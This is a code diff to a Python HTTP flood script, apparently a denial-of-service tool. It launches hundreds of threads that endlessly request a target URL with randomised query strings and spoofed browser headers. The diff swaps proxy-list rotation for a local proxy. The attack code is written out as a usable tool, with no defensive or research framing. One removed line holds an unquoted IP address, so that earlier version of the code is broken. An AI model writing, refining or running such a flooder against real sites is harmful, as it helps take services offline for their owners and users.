@@ -8229,25 +8229,27 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 			
 
 class Spammer(threading.Thread):
-    def __init__(self, url, number, lista):
+    def __init__(self, url, number):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
+        self.url = (
+            url + "?" +
+            "&".join(
+                [f"{random.randint(0, 99999999)}={random.randint(0, 99999999)}" for _ in range(10)]
+            )
+        )
         self.num = number
         self.headers = {
             'User-Agent': random.choice(ua),
             'Keep-Alive': random.randint(110, 9960),
             'Referer': random.choice(ref),
-            'x-Forwarded-For': 8.8.1.1
         }
         self.Lock = threading.Lock()
-        self.lista = lista
 
     def request(self):
         global N
         data = None
-        if N >= (len(self.lista) - 1):
-            N = 0
-        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
+        # Use the local proxy `127.0.0.1:8080`
+        proxy = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
         opener = urllib.request.build_opener(proxy)
         urllib.request.install_opener(opener)
         req = urllib.request.Request(self.url, data, self.headers)
@@ -8258,27 +8260,32 @@ class Spammer(threading.Thread):
         print(Fore.RED + "0000000000000000000000000000")
         print(Style.RESET_ALL, end="")
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
+        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | Routing via http://127.0.0.1:8080")
         sys.stdout.flush()
         sys.stdout.write("\r")
 
     def run(self):
-        global N
         self.Lock.acquire()
         print("Thread #%4d |" % self.num)
         self.Lock.release()
         time.sleep(1)
         while True:
             try:
-                N += 1
                 self.request()
-            except:
-                pass
+            except Exception as e:
+                print(f"Error: {e}")
         sys.exit(0)
 
 class MainLoop():
     def __init__(self):
-        if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
+        if os.name in (
+            "nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos",
+            "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux",
+            "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris",
+            "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios",
+            "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian",
+            "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"
+        ):
             self.title()
 
     def title(self):
@@ -8317,22 +8324,13 @@ class MainLoop():
 
         while True:
             try:
-                proxy_file = input('> Enter the path to the proxy list: ')
-                with open(proxy_file, 'r') as in_file:
-                    proxy_list = [i.strip() for i in in_file.readlines()]
-                break
-            except:
-                print('Error reading the proxy list file.')
-
-        while True:
-            try:
                 num_threads = int(input('> Enter the number of threads [600]: ') or '600')
                 break
             except:
                 print('Invalid input. Please enter a number.')
 
         for i in range(num_threads):
-            Spammer(url, i + 1, proxy_list).start()
+            Spammer(url, i + 1).start()
 
 if __name__ == '__main__':
     N = 0
